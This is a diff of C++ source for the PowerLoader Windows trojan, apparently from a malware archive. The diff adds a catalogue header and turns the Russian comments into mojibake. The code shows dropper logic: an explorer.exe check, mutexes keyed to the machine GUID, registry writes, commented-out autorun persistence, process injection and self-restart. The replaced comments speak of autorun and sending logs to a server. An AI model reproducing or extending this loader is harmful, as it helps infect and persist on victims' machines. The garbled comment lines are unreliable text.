@@ -1,3 +1,14 @@
+/*
+  name      PowerLoader
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <intrin.h>
 #include <stdio.h>
 #include <windows.h>
@@ -61,7 +72,7 @@ DWORD Drop::InjectStartThread(PVOID Context)
 
 	Config::ReadConfig();
 
-	// Если мы эксплорер и это первый запуск наш в этой системе записываем себя в авторан и все дела
+	// пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	if (!lstrcmpi(CurrentProcess, "explorer.exe") && Utils::CreateCheckMutex(DROP_EXP_MUTEX_ID, Drop::GetMachineGuid()))
 	{	
 		Protect::StartProtect();
@@ -134,7 +145,7 @@ VOID Entry()
 
 	if (IntegrityLevel != SECURITY_MANDATORY_LOW_RID)
 	{
-		// Проверям основной мьютекс и мьютекс что бы два дроппера одновременно не запустились
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if (Utils::CheckMutex(DROP_EXP_MUTEX_ID, Drop::GetMachineGuid()) && (DropMutex = Utils::CreateCheckMutex(DROP_RUN_MUTEX_ID, Drop::GetMachineGuid())))
 		{	
 			Config::RegWriteString("CurrentPath", Drop::CurrentModulePath);
@@ -149,7 +160,7 @@ VOID Entry()
 				}
 			}
 
-			// Записываем в новую папку и добавляем в авторан в реестр
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			// Protect::WriteFileToNewPath(Drop::CurrentModulePath, NewFileName);
 			// Protect::AddKeyToRun(NewFileName);
 
@@ -161,7 +172,7 @@ VOID Entry()
 			bInject = TRUE;
 		}
 	}
-	// Если инжект не прошел или траблы с IntegrityLevel перезапускаем себя и отправляем логи на сервер
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ IntegrityLevel пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!bInject)
 	{
 		aRestartModuleShellExec(Drop::CurrentModulePath);
